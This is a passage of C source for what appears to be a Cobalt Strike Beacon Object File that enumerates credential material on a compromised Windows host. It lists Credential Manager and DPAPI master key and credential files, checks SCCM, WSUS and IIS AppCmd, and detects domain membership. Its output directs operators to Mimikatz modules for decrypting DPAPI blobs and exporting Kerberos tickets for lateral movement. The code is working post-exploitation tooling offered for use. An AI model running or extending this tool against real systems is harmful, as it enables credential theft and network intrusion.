            KERNEL32$FindClose(hFind);
        }
    }
    
    if (credCount == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[CRED_MANAGER] No credential files found\n");
    } else if (credCount >= 20) {
        BeaconPrintf(CALLBACK_OUTPUT, "[CRED_MANAGER] ... (showing first 20)\n");
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[CRED_MANAGER] Note: Use 'cmdkey /list' or specialized tools for credential extraction\n");
}

void CheckDPAPIMasterKeys(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] DPAPI MASTER KEYS CHECK\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    // Check for DPAPI master keys in user profiles
    char protectPaths[][MAX_PATH] = {
        "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Protect",
        "C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Protect"
    };
    
    int keyCount = 0;
    for (int i = 0; i < 2; i++) {
        WIN32_FIND_DATA findData;
        char searchPath[MAX_PATH * 2];
        MSVCRT$sprintf(searchPath, "%s\\*", protectPaths[i]);
        
        HANDLE hFind = KERNEL32$FindFirstFileA(searchPath, &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    char fullPath[MAX_PATH * 2];
                    MSVCRT$sprintf(fullPath, "%s\\%s", protectPaths[i], findData.cFileName);
                    BeaconPrintf(CALLBACK_OUTPUT, "[DPAPI_MASTERKEYS] Found master key: %s\n", fullPath);
                    keyCount++;
                    if (keyCount >= 20) break;
                }
            } while (KERNEL32$FindNextFileA(hFind, &findData) && keyCount < 20);
            KERNEL32$FindClose(hFind);
        }
    }
    
    if (keyCount == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[DPAPI_MASTERKEYS] No master keys found\n");
    } else if (keyCount >= 20) {
        BeaconPrintf(CALLBACK_OUTPUT, "[DPAPI_MASTERKEYS] ... (showing first 20)\n");
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[DPAPI_MASTERKEYS] Note: Use Mimikatz 'dpapi::masterkey' module to decrypt\n");
}

void CheckDPAPICredFiles(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] DPAPI CREDENTIAL FILES CHECK\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    // Check for DPAPI credential files
    char credPaths[][MAX_PATH] = {
        "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Credentials",
        "C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Credentials"
    };
    
    int credCount = 0;
    for (int i = 0; i < 2; i++) {
        WIN32_FIND_DATA findData;
        char searchPath[MAX_PATH * 2];
        MSVCRT$sprintf(searchPath, "%s\\*", credPaths[i]);
        
        HANDLE hFind = KERNEL32$FindFirstFileA(searchPath, &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    char fullPath[MAX_PATH * 2];
                    MSVCRT$sprintf(fullPath, "%s\\%s", credPaths[i], findData.cFileName);
                    BeaconPrintf(CALLBACK_OUTPUT, "[DPAPI_CREDFILES] Found credential file: %s\n", fullPath);
                    credCount++;
                    if (credCount >= 20) break;
                }
            } while (KERNEL32$FindNextFileA(hFind, &findData) && credCount < 20);
            KERNEL32$FindClose(hFind);
        }
    }
    
    if (credCount == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[DPAPI_CREDFILES] No credential files found\n");
    } else if (credCount >= 20) {
        BeaconPrintf(CALLBACK_OUTPUT, "[DPAPI_CREDFILES] ... (showing first 20)\n");
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[DPAPI_CREDFILES] Note: Use Mimikatz 'dpapi::cred' module to decrypt\n");
}

void CheckSCCM(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] SCCM (SYSTEM CENTER CONFIGURATION MANAGER) CHECK\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    // Check for SCCM client executable
    char sccmPath[] = "C:\\Windows\\CCM\\SCClient.exe";
    if (GetFileAttributesA(sccmPath) != INVALID_FILE_ATTRIBUTES) {
        BeaconPrintf(CALLBACK_OUTPUT, "[SCCM] SCCM Client found at: %s\n", sccmPath);
    }
    
    // Check SCCM registry settings
    HKEY hKey;
    char valueName[256];
    DWORD valueType = 0;
    DWORD valueSize = 0;
    
    // Check LastValidMP
    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\CCMSetup", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        valueSize = sizeof(valueName);
        if (ADVAPI32$RegQueryValueExA(hKey, "LastValidMP", NULL, &valueType, (LPBYTE)valueName, &valueSize) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[SCCM] LastValidMP: %s\n", valueName);
        }
        ADVAPI32$RegCloseKey(hKey);
    }
    
    // Check Site Code and Product Version
    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\SMS\\Mobile Client", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        valueSize = sizeof(valueName);
        if (ADVAPI32$RegQueryValueExA(hKey, "AssignedSiteCode", NULL, &valueType, (LPBYTE)valueName, &valueSize) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[SCCM] Site Code: %s\n", valueName);
        }
        valueSize = sizeof(valueName);
        if (ADVAPI32$RegQueryValueExA(hKey, "ProductVersion", NULL, &valueType, (LPBYTE)valueName, &valueSize) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[SCCM] Product Version: %s\n", valueName);
        }
        ADVAPI32$RegCloseKey(hKey);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[SCCM] SCCM not installed (or access denied)\n");
    }
}

void CheckWSUS(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] WSUS (WINDOWS SERVER UPDATE SERVICES) CHECK\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    HKEY hKey;
    char valueName[512];
    DWORD valueType = 0;
    DWORD valueSize = sizeof(valueName);
    
    // Check WSUS server settings
    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (ADVAPI32$RegQueryValueExA(hKey, "WUServer", NULL, &valueType, (LPBYTE)valueName, &valueSize) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[WSUS] WUServer: %s\n", valueName);
            if (SHLWAPI$StrStrIA(valueName, "http://") != NULL) {
                BeaconPrintf(CALLBACK_OUTPUT, "[WSUS] [!] Non-SSL WSUS server detected - vulnerable to WSUXploit!\n");
            }
        }
        valueSize = sizeof(valueName);
        if (ADVAPI32$RegQueryValueExA(hKey, "WUStatusServer", NULL, &valueType, (LPBYTE)valueName, &valueSize) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[WSUS] WUStatusServer: %s\n", valueName);
        }
        ADVAPI32$RegCloseKey(hKey);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[WSUS] No WSUS policy found (or access denied)\n");
    }
}

void CheckAppCmd(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] APPCMD.EXE CHECK\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    // Check for AppCmd.exe
    char appCmdPath[] = "C:\\Windows\\System32\\inetsrv\\appcmd.exe";
    if (GetFileAttributesA(appCmdPath) != INVALID_FILE_ATTRIBUTES) {
        BeaconPrintf(CALLBACK_OUTPUT, "[APPCMD] AppCmd.exe found at: %s\n", appCmdPath);
        BeaconPrintf(CALLBACK_OUTPUT, "[APPCMD] Note: AppCmd.exe can be used to extract IIS credentials from application pools and virtual directories\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[APPCMD] Note: Requires administrator privileges to extract credentials\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[APPCMD] AppCmd.exe not found (IIS may not be installed)\n");
    }
}

void CheckSSClient(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] SSClient.exe CHECK (SCCM CLIENT)\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    // Check for SSClient.exe (SCCM client)
    char ssClientPath[] = "C:\\Windows\\CCM\\SSClient.exe";
    if (GetFileAttributesA(ssClientPath) != INVALID_FILE_ATTRIBUTES) {
        BeaconPrintf(CALLBACK_OUTPUT, "[SSClient] SSClient.exe found at: %s\n", ssClientPath);
        BeaconPrintf(CALLBACK_OUTPUT, "[SSClient] Note: SSClient.exe is the SCCM (System Center Configuration Manager) client\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[SSClient] Note: Check SCCM settings for potential credential extraction\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[SSClient] SSClient.exe not found (SCCM client may not be installed)\n");
    }
    
    // Also check for CCM folder
    char ccmPath[] = "C:\\Windows\\CCM";
    if (GetFileAttributesA(ccmPath) != INVALID_FILE_ATTRIBUTES) {
        BeaconPrintf(CALLBACK_OUTPUT, "[SSClient] CCM folder exists - SCCM client may be installed\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[SSClient] Note: Check CCM\\Logs for configuration and connection information\n");
    }
}

void CheckKerberosTickets(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] KERBEROS TICKETS CHECK\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    // Note: Full Kerberos ticket enumeration requires LSA API (LsaConnectUntrusted, LsaLookupAuthenticationPackage, LsaCallAuthenticationPackage)
    // This is a simplified check that provides instructions and checks for common indicators
    
    BeaconPrintf(CALLBACK_OUTPUT, "[KERBEROS] Note: Full ticket enumeration requires LSA API calls\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[KERBEROS] Note: Use 'klist' command to list current user's Kerberos tickets\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[KERBEROS] Note: Use 'klist tickets' to see all cached tickets\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[KERBEROS] Note: Use Mimikatz 'kerberos::list' or 'kerberos::tgt' to extract tickets\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[KERBEROS] Note: For all users (requires admin): Use 'klist sessions' or Mimikatz 'kerberos::list /export'\n");
    
    // Check if we're in a domain environment (simplified check)
    HKEY hKey;
    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char domainName[256] = {0};
        DWORD valueSize = sizeof(domainName);
        if (ADVAPI32$RegQueryValueExA(hKey, "DomainName", NULL, NULL, (LPBYTE)domainName, &valueSize) == ERROR_SUCCESS) {
            if (MSVCRT$strlen(domainName) > 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "[KERBEROS] Domain detected: %s\n", domainName);
                BeaconPrintf(CALLBACK_OUTPUT, "[KERBEROS] Note: In domain environment, Kerberos tickets are likely present\n");
            }
        }
        ADVAPI32$RegCloseKey(hKey);
    }
    
    // Check for Kerberos service
    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\kdc", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[KERBEROS] KDC (Key Distribution Center) service found - this is a domain controller\n");
        ADVAPI32$RegCloseKey(hKey);
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[KERBEROS] Note: Kerberos tickets can be used for lateral movement and privilege escalation\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[KERBEROS] Note: Look for TGT (Ticket Granting Ticket) and service tickets\n");
}

